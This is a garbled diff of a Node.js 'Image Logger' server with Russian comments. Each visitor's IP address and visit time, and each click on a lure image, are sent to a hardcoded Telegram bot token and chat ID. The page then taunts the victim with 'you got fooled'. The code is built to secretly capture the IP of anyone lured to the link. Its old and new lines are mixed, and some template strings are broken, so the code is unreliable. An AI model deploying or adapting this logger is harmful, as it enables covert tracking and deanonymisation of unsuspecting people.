const express = require('express');
const fetch = require('node-fetch');
const app = express();
@@ -7,26 +6,47 @@ const PORT = process.env.PORT || 3000;
const TELEGRAM_BOT_TOKEN = '7998823383:AAHL12ziRMoiiNNKthbrW46ZfHnXfqur8bU';
const TELEGRAM_CHAT_ID = '6381947984';

app.get('/', (req, res) => {
  res.send(\`
app.get('/', async (req, res) => {
  let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
  ip = ip.split(',')[0].trim();
  if (ip.startsWith('::ffff:')) {
    ip = ip.substring(7);
  }

  const message = `🌐 Переход на сайт\nIP: ${ip}\nВремя: ${new Date().toLocaleString()}`;

  const url = `https://api.telegram.org/bot${7998823383:AAHL12ziRMoiiNNKthbrW46ZfHnXfqur8bU}/sendMessage`;
  await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: message
    })
  });

  res.send(`
    <html>
      <head><title>Image Logger</title></head>
      <head><title>IP Logged</title></head>
      <body>
        <h2>Нажми на изображение 👇</h2>
        <img src="https://i.pinimg.com/236x/8a/9a/a5/8a9aa5b26fc0deda0f96c96d730abfba.jpg" onclick="fetch('/log-ip')" style="cursor:pointer;">
        <h2>Добро пожаловать!</h2>
        <p>Тебя наебали 😜</p>
        <img src="https://i.pinimg.com/236x/8a/9a/a5/8a9aa5b26fc0deda0f96c96d730abfba.jpg">
      </body>
    </html>
  \`);
  `);
});

app.get('/log-ip', async (req, res) => {
  const ipResponse = await fetch('https://api.ipify.org?format=json');Add commentMore actions
  const ipData = await ipResponse.json();
  const ip = ipData.ip;
 let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
ip = ip.split(',')[0].trim();
if (ip.startsWith('::ffff:')) {
  ip = ip.substring(7);
}

  const message = \`📸 Клик по фото\nIP: \${ip}\nВремя: \${new Date().toLocaleString()}\`;
  const message = `📸 Клик по фото\nIP: ${ip}\nВремя: ${new Date().toLocaleString()}`;

  const url = \`https://api.telegram.org/bot\${7998823383:AAHL12ziRMoiiNNKthbrW46ZfHnXfqur8bU}/sendMessage\`;
  const url = `https://api.telegram.org/bot$7998823383:AAHL12ziRMoiiNNKthbrW46ZfHnXfqur8bU}/sendMessage`;
  await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
@@ -40,5 +60,5 @@ app.get('/log-ip', async (req, res) => {
});

app.listen(PORT, () => {
  console.log(\`Сервер запущен на порту \${PORT}\`);
  console.log(`Сервер запущен на порту ${PORT}`);
});
